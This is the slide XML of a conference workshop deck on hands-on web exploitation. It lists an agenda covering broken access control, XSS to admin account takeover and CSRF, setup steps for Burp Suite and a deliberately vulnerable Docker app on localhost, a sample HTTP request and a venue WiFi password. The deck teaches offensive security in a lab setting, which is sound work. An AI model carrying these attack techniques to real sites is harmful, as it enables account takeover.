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97" r:id="rId7"/>
    <p:sldId id="298" r:id="rId8"/>
    <p:sldId id="299" r:id="rId9"/>
    <p:sldId id="300" r:id="rId10"/>
    <p:sldId id="306" r:id="rId11"/>
    <p:sldId id="262" r:id="rId12"/>
    <p:sldId id="263" r:id="rId13"/>
    <p:sldId id="264" r:id="rId14"/>
    <p:sldId id="265" r:id="rId15"/>
    <p:sldId id="296" r:id="rId16"/>
    <p:sldId id="266" r:id="rId17"/>
    <p:sldId id="267" r:id="rId18"/>
    <p:sldId id="268" r:id="rId19"/>
    <p:sldId id="269" r:id="rId20"/>
    <p:sldId id="270" r:id="rId21"/>
    <p:sldId id="271" r:id="rId22"/>
    <p:sldId id="295" r:id="rId23"/>
    <p:sldId id="272" r:id="rId24"/>
    <p:sldId id="273" r:id="rId25"/>
    <p:sldId id="282" r:id="rId26"/>
    <p:sldId id="283" r:id="rId27"/>
    <p:sldId id="279" r:id="rId28"/>
    <p:sldId id="280" r:id="rId29"/>
    <p:sldId id="274" r:id="rId30"/>
    <p:sldId id="275" r:id="rId31"/>
    <p:sldId id="276" r:id="rId32"/>
    <p:sldId id="277" r:id="rId33"/>
    <p:sldId id="307" r:id="rId34"/>
    <p:sldId id="278" r:id="rId35"/>
    <p:sldId id="281" r:id="rId36"/>
    <p:sldId id="285" r:id="rId37"/>
    <p:sldId id="284" r:id="rId38"/>
    <p:sldId id="286" r:id="rId39"/>
    <p:sldId id="287" r:id="rId40"/>
    <p:sldId id="288" r:id="rId41"/>
    <p:sldId id="289" r:id="rId42"/>
    <p:sldId id="291" r:id="rId43"/>
    <p:sldId id="290" r:id="rId44"/>
    <p:sldId id="292" r:id="rId45"/>
    <p:sldId id="301" r:id="rId46"/>
    <p:sldId id="302" r:id="rId47"/>
    <p:sldId id="303" r:id="rId48"/>
    <p:sldId id="304" r:id="rId49"/>
    <p:sldId id="30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CA95"/>
    <a:srgbClr val="282828"/>
    <a:srgbClr val="EAE6DD"/>
    <a:srgbClr val="2E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/>
    <p:restoredTop sz="88980"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr>
        <p:scale>
          <a:sx n="106" d="100"/>
          <a:sy n="106" d="100"/>
        </p:scale>
        <p:origin x="17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46425-8332-A148-AB73-FCBDF823B093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D483C-007A-6F4C-8707-C1B40D2EC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0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04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80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91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01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43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430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A086-B18F-D770-9B6F-1EDA29EE4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F7FC2-5499-5C33-C421-DD26F3510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90017-3554-F857-5403-72DDD3D5A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88733-2D6A-BAF7-343B-31A8E298D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75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75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AD074-21E2-F66B-5670-31286F2B0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D97F3-76E5-F1E3-117F-DDDECDB40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E3DFB-641C-9F9D-B9F8-2B3B36F1F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69B84-19E4-EE30-05A3-2C070838C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55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0A6C-A5F3-CB54-3FE0-B2F8B5C5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52BC3-1361-BB62-0B84-17E85AA45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FC44B-7690-2F8F-70B7-7EBB012B3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D2277-1F83-4548-5A65-83CF4EEE0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85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F1B1-6EC9-ECE0-94F7-784D3E74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0C763-3D74-F2AB-FCE8-9D83DD917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698A0-38DB-084A-0089-84910C299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F18F5-01D5-FAEC-6B90-9A2D1D301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79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B2250-863B-34B9-84CC-C945A050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40C66-0DF7-0158-62DF-9FFB11EE3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2E170-6E6D-0292-3E30-D6191B94B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194F8-AECA-F792-D97B-CB28A5CC8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39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4E62-62C4-60C2-9B97-0609DE772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4C3A8-1AC9-A76B-F2F4-BD398AF98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01793-29EB-08CE-B889-5DF4E84BD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16823-FD9B-EE8E-8488-A84B7120B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48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CCB0-1655-9C76-02A8-BBDDCDF22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8FC90-A052-7BF9-93E6-44449727C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73C6D-258F-35CF-F512-47191EACE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AAAE0-5BD3-CA12-F745-62895DE1D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0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9A8D1-D08C-61F4-26A4-88D55696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21BBC-F882-377E-4D0A-2FA86C12A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E1147-8609-A087-246D-719AF795E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E07A4-E127-3FAF-EE23-89F7FEC13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87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AB7AA-CF89-577F-5F46-AFD658359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9C23E-DD04-D914-8403-B88A29BE2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F1E08-F2A4-59B4-1145-F7ABCC33F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B3B10-FC54-4E99-B954-F122424AB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33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41B99-B1C7-3CBB-4E97-4DECDA58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E5D57-7DDC-EDDC-6786-24E7F8016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DEC07-66DD-3E78-FD70-FE57A7434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A0669-9119-C61E-AECC-A86AAEDA4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037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CAABB-626F-FBB6-B535-975D2037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711A0-D7E4-8B73-3C1E-452CA0524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03369-EE9A-6DA8-E2EE-1D3D3C389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31D99-8B30-313F-983F-0CCD32559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40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C96C-215F-DFD3-094B-D3E79227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750DE-872B-E419-0CAE-EC8C8F87C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240F2-7A38-393D-6708-5885DF886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8AF7D-E882-4B88-53AF-3C1E5871B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7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EA65C-E8C3-EE3D-2742-6B8EBE77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37DF3-F91A-4EE1-FFB5-B232D8F0F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FBF3E-A21F-D43A-A1DD-E31FC9DF5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EBDEF-C7ED-EA36-EA86-9D897A935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73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98B8-8150-834C-56F7-30BB290F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2BA5-D254-B2D5-7B2D-6B32ABE08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E5453-4265-326E-589A-B10647CF5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902D6-FD92-99A5-5F14-9D4AAE6C6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662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FB4E-B803-195F-7FD1-5B9C486CD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E9D24-BEAF-FF69-83BB-15426071B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F87E-6CF6-14F4-A015-4DA4F361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33730-A786-7B2E-69A7-0A625EB11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907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F9A3-29F9-BF1B-4E07-2E32EF6F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39C7F-4C6C-E3DD-A097-DE4D1EA6A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F2FD3-8CBF-B28B-F36A-E30B48841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08C0E-95A8-B102-0C6D-DA345FC2C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85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5EE33-93F1-CF3F-F780-3D4C0AA6E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E312D-A86F-8E7B-62B9-A553B607D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6A2F-5AF3-9967-1A78-1AE298E16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B11DB-C0A2-6274-B754-5FD51C5AC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66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44E6-0B02-5566-7029-A86BD0892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13904C-9C59-C63A-E772-977C86FAA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E2CBC-E9CC-C538-1726-273BB57C8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4ACA3-6577-86D7-87EA-0D5BEA68E1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608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A42B-6520-90C9-FB89-BDCF403F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BC7ED-C943-8CE7-A01D-29966C1CE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C40E7-D8F1-FF8B-0D22-A47A93071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E741D-4916-3668-954B-EC466E6BA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379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E595-47CB-7BDA-D5FA-B25143DF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47E7F-9532-9B08-80B0-2BDFFDF43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95136-FCD5-3824-9920-BF037F9B5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C5683-3BFC-5622-BF45-679DB832D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D483C-007A-6F4C-8707-C1B40D2ECDF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1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120D-07FC-C12A-FDB1-EF166F1B6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36FE1-7100-6350-11BD-7B37B817B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5DD22-A650-659B-2B3A-BF74AC7C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E0DB6-B976-05CF-7ECF-E13C7664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8CA40-9403-5A59-B660-F4D39CB2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0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599F-BC35-3F1E-2BBE-F720A59D0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86F2F-197C-3BF8-B594-9B3B85D42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8B485-C7F6-0042-0D53-07480984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81483-93C8-1AD5-92F1-0417059F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1B20F-94E4-C293-8405-D250818E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7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71F6-D3A6-8A59-DFBD-D815C0CE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2804-0A6E-FE14-733C-601AB2D7F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B2E69-5929-CB4E-32D0-824D003B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6E46-F490-D20D-2CDB-530EC755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925F5-EC55-F6E3-49F5-3A900F40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89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F11C-2ABA-5184-593E-543C8F41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E6ECF-5995-2A5D-CADB-B8ED45576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4D9AF-24CF-88A2-D35E-60CCAE0DF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F8FA2-915D-9856-F139-57A02394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2355B-2B5C-5FA4-C3B8-DDD0215E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BA85A-3EC5-C315-7F96-3EA5C0FE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4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54BA-EAFA-AAC6-C447-9A2DD4CB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C9535-B7B1-333D-FAB2-C226EC7D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DBF95-F52D-08F3-4BDB-00E445280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FD2BC-3285-F832-1926-041B02DFF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7E9DC-4543-B666-AA01-9E03EAFF7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20FFF-7DD2-6BB4-7218-8F94B565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9DE8C-F67C-55D0-6500-F24C2D95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60D75-5595-487E-853B-6C614D9D7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56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174AC-9654-897A-1E9A-AF82C263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EBBCD7-E7C0-67EF-CF7B-1632570F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03BFC-CAB1-D240-6B08-4D00151E3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6AEBD-58BE-8416-E1A6-014F282C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8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17EFE2-1695-EA07-F4E8-4A8199CE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763C5-6A3B-ED95-04DB-C4A570D7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68FE9-CA26-3506-99D4-564C94C6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11DF-AA70-1F14-5D01-F2EB5A81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5CEE-C096-B2C8-9CEC-D6D67FB45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04DC5-82A1-D688-9B56-0A4A7BF1E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F4BDD-38B8-E3C9-E289-022B0FCBF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7EBF1-85B6-B442-017E-9A8CAF7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BE991-5AE1-1AA9-22E0-DF0A4258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3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9F85F-04D5-439A-734F-B645FDCC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D5525-58F1-603B-C1A0-6BEF74236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084B9-1D38-9F11-97BF-8D7EBB516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1DD89-F6B2-3240-AF80-DF272833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CAAEA-EC86-4E32-9A3A-A7EA7DA8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9AF3A-88E0-707E-4CB5-D7A7F594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72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B350F-17CD-962C-ECE2-82B728D8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0AAB6-9E74-6CDA-B046-2228593F6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0B4DE-71E1-6BBA-9DDA-CF7ED5F73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3FB96-8042-3DEC-84BE-1497B458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B501C-5BB8-4D52-E467-8755D2D0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4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FA26F5-B11C-7FCF-1086-2DDB49ED3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76060-827F-3301-F78B-D8538F1E9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BFBA9-EF9F-D509-F610-16148D8BB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EBC2-BB53-62CD-D3AD-5F0CAB78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8DE02-3568-B071-0C5C-23CF81D4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6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99B5A-D776-0BD0-38FF-6B111D8A2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00EDB-A4DC-1AB0-12F7-AED293071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2F8BB-A073-7A8A-44B4-2DE3A313E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3B69D-30F6-4B46-AA50-84F7D1D34F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BE694-9774-8AF0-0375-4290BFF50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3912F-6D46-DE6A-97F5-27EC8A0FD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7A57B-7C6C-914C-B898-663E682E7F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4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Apipia/cc14-vulnerable-app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://localhost:30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7D99-B721-186D-893F-23F5756CD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563" y="1284288"/>
            <a:ext cx="8310561" cy="23876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Advanced Web Threats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1833C-7A0A-FD51-8D66-98310AFF7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564" y="4575175"/>
            <a:ext cx="2000250" cy="998537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Cactus Con 14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Anthony Pipia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682417-2420-86E7-295A-0BF9D6BDC3DA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="3671888"/>
            <a:ext cx="12192000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333E3D44-614B-EC4F-F5F0-CE34525CD4C1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1071564" y="3852069"/>
            <a:ext cx="5024436" cy="542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A Hands-On Exploitation Workshop</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="16" name="Picture 15" descr="A pixel art of a green character&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{386CFC7C-EF58-B7C0-8A25-2CD3A6A73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62" y="2378869"/>
            <a:ext cx="14732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EEF1D-868E-7045-9B79-6E21D0DB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94E5-B4A0-DCA3-E831-1FDFB554E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306" y="119858"/>
            <a:ext cx="2976563" cy="90328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4FF4408-B2B6-9763-6173-C5C7F63DBDF6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="559595" y="2008983"/>
            <a:ext cx="7941467" cy="3777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&gt; Configuration and Setup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Web Application Security Basics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Broken Access Control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XSS to Admin Account Takeover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Cross-Site Request Forgery (CSRF)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Extra Activities with OWASP Juice Shop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6" name="Picture 15" descr="A pixel art of a green character&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{01DCE330-E3C0-AC87-07E4-16C459AAB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262" y="5384800"/>
            <a:ext cx="1473200" cy="1473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641A5DB-91F0-257F-935A-14BA48A84362}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8501062" y="3201984"/>
            <a:ext cx="3195640" cy="1978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For each section we will have a short lecture then a hands-on exercise</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3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93FE9323-AE19-5B46-98A1-256388CE9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BBD3EA-FD08-C976-DC59-3398072542AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="0" y="1143001"/>
            <a:ext cx="12191999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ubtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5AF71C1E-CA1D-71A9-E99A-5BD88D2D3C32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693829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272A5-C18A-BBC4-D1A9-43959FB8B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7BA3-9E71-1833-D201-44C6504E1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7511" y="119859"/>
            <a:ext cx="8980883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Setup and Configuration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C72436-0C8B-6D38-4606-2F3F7627B802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7E4043-A6AA-6B24-34CF-BC48A6B96158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1EF149-47E5-76DB-B16A-2BE3FECE738E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90996B-223D-FB00-DE68-B3D3D96155AC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F920DA-10A9-DEE0-E3AB-B3FBB42321F9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614BA8-F72C-805D-9107-A4B66257AEB9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1A08AA-A7E7-DB73-4D79-84F95214FCB3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ubtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60FF57D3-D6D3-F32E-E46B-BB8C43CCB803}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957511" y="1540271"/>
            <a:ext cx="8980883" cy="247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What You’ll Need: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Burp Suite Community Edition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The Vulnerable Application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Docker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9123764A-D44B-7BDF-FE4D-EAE9D7C66CEE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957511" y="3954863"/>
            <a:ext cx="8980883" cy="2783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Download Burp Suite Community Edition and Install it (just google it)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Clone the Application Repository from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://github.com/Apipia/cc14-vulnerable-app</a:t>
            </a:r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Download Docker (just google it)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9D7BE421-1C0F-8762-0C03-09E9CFD16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3665B77-3E64-C5FE-6073-18B382169F4F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91F54-2A46-1850-6547-39A232C85AFF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9288379" y="1684421"/>
            <a:ext cx="26500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WIFI:   Cactus2026!</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="142959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DE3E6-D3E8-9B21-A7C1-E68F3664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DBCEA-829D-CCDB-51DC-3C8B34F37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7511" y="119859"/>
            <a:ext cx="8980883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Setup and Configuration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061F7C-2730-A578-75E4-B4EBE5CB6479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EE5F1A-2603-87DB-C80A-3FBD1FADAAD2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F29887-8B57-99B0-62E1-367C93C32999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74D39D-EB54-8148-2C2B-AF33D63B384E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B15D53-F106-BE1D-FE21-98C3DD5735C1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2A7EF-8280-65C5-1FF9-86B5947088BD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5D9B82-1473-4D7B-3295-90694F7E69D9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ubtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2366595D-7CA4-EA5A-8060-D7A866EBC59E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957511" y="1540272"/>
            <a:ext cx="8980883" cy="50891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DOCKER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Start Docker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In a terminal: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1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Navigate into the repository</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1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Run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="28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docker-compose up --build</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" algn="l">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="808080"/>
              </a:highlight>
              <a:latin typeface="Andale Mono" panose="020B0509000000000004" pitchFamily="49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Don’t want to use Docker?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Check README.MD for instructions on installing and running application with NPM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(not recommended)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734E7-C974-97A9-0E93-250EDC348657}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7595974" y="1308583"/>
            <a:ext cx="462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67CA95"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Check out the README.MD file for more specific instructions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5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A21B6D9-E974-3895-ED8B-33DE5B733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16A9E7D-6CED-6972-ED12-0D940F5FEB44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407017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B0225-2818-E726-E92E-7CA0C84E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0F1F-124B-0337-BE00-BF6642E29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7511" y="119859"/>
            <a:ext cx="8980883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Setup and Configuration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7B94B-7534-2459-9D09-89D700278C2D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3B3565-7683-97F1-7BD8-3B969B52DE69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B9D610-64D3-B94B-8686-CF132DC8C9C3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90895E-50CA-0864-3607-8B47277650FC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EA3029-6285-DC15-1EFF-216E595F452D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8D91E9-3641-301F-D477-7B112E2718F2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C9F104-02D5-172B-8238-E68D52D58365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22A7CACE-9706-4119-1E1A-580AB3878AE7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957511" y="1540272"/>
            <a:ext cx="8980883" cy="50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The Starting Line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Open Burp Suite Community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Start a Temporary Project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Open the Burp Chromium Browser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Navigate to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://localhost:3000</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRP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Explore the application</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3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F14C754B-A085-FB10-1F5B-C0E61DE43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5C55E21E-C25E-BE3D-F574-67F3C0E36CAC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76049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3CF0B-BF94-D886-11E9-6C96A190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5C8C6-171F-56D0-FD05-502A6F022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The Internet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AE10D-DCA5-5702-AD22-E6D1B204F2B6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D33054-65BC-3D56-74F8-94FC09AC2C47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3B8350-72FB-CFA8-79FA-D32635F4DCCA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DBD24-E4B7-A28A-42BB-2F3742786546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D921E3-C24D-F831-6B6D-D5F704603FE8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616B94-B1BF-F195-C1CE-941F81908CA3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FBA61B-BC37-CBF1-51DA-47525184D226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xelated cartoon of a cactus sitting on a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7026307E-727D-B019-17AC-6E084F71C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701" y="2865924"/>
            <a:ext cx="1473201" cy="1473200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5289ABCC-B9CD-2B05-4C67-9B62725E9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6834" y="2573042"/>
            <a:ext cx="1975659" cy="1975659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6EF2A088-1746-7D28-E9DB-98B081BDFB54}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8724801" y="2286000"/>
            <a:ext cx="3033328" cy="4998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Backend Server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BCD8F091-04E7-86CF-2FFC-00EDA5F4A585}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2814638" y="2323130"/>
            <a:ext cx="3033328" cy="4998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The Client</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="27" name="Graphic 26" descr="Document with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E28A078F-E9CA-BD73-D3B7-8CC725B18B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3982" y="2557223"/>
            <a:ext cx="914400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="28" name="Graphic 27" descr="Document with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5B0B119C-96C5-AB59-DDD0-6DEEE0D2C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9985" y="2215860"/>
            <a:ext cx="914400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="29" name="Graphic 28" descr="Document with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B5D7CA87-2FE0-9877-36AD-FAA8C6DEE7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8337" y="2338294"/>
            <a:ext cx="914400" cy="91440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9FC5364-A678-D4BA-EFE3-7C43753E22DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5384800" y="3471623"/>
            <a:ext cx="3924300" cy="0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ubtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B2D81DDB-C6F0-B939-8A34-6698C8F2B97F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5914027" y="3148048"/>
            <a:ext cx="3033328" cy="499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Requests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6AB138D-69F1-9BB2-D84B-711E9DA949CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="5308600" y="4301024"/>
            <a:ext cx="4076700" cy="0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80D9D2A9-86FB-DF34-B8CE-01E2EB4669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3937" y="4556730"/>
            <a:ext cx="914400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="37" name="Graphic 36" descr="Document with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{20739E7C-D17C-0B83-4DD2-32DDE79AB8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3470" y="4663001"/>
            <a:ext cx="914400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="38" name="Graphic 37" descr="Document with solid fill">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2A1A6F94-D634-57B2-C207-AE8A3A640B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6950" y="4513572"/>
            <a:ext cx="914400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Subtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DF875B2A-FB91-AA0D-52F6-D7CB3B4F722B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5754006" y="4281084"/>
            <a:ext cx="3033328" cy="499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Responses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CB1535FB-755B-2C92-954B-DC10E1F41D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BB56CE2-D6E8-E2F3-D8FF-E6F4A798DA02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01769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DB40A-46AF-9F8F-06D7-3D7AC9075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1BA4-DEB8-D612-87D7-57705CE5D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Anatomy of Requests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A3E34-1566-98B7-3793-EC6B8DA1ED02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D7B50E-DEA1-3951-17A2-9428FA0C5872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52BB3E-BDBD-7F67-5C3E-40EF6D7854E1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DA1AB9-725D-80C8-9982-AC95D0D3A12C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AC181-A721-7BAB-E1DB-49E3B965C532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6BE444-0744-D89D-AEDE-561AC1C79011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A88C33-D2EF-A3DD-34A3-E5597383B4BB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222C4C5-1358-A20A-D9E3-76C7776D4E2B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3209920" y="1841505"/>
            <a:ext cx="6134101" cy="4615346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820E0-74E8-27A8-572F-BC26C3257EC3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3365500" y="2137477"/>
            <a:ext cx="61341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GET /post/1337?foo=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bar&amp;field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=value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Location: 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www.socialmedia.com</a:t>
            </a:r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Cookies: foo=bar; con=cactus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Accept: application/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json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User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)</a:t>
            </a:r>
          </a:p>
          <a:p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Referer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: http://localhost:3000/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Accept-Encoding: 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gzip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, deflate, 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br</a:t>
            </a:r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  <a:p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D89EA9B-57CA-74E4-044F-AAA62EDC9F68}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3209920" y="2760423"/>
            <a:ext cx="7318380" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="67CA9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568F68-B1DD-3560-5278-DD1071FC37A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3209920" y="4449523"/>
            <a:ext cx="7318380" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="67CA9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B5504EA-669C-1D56-3F1B-9C908B43A238}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9378950" y="1885466"/>
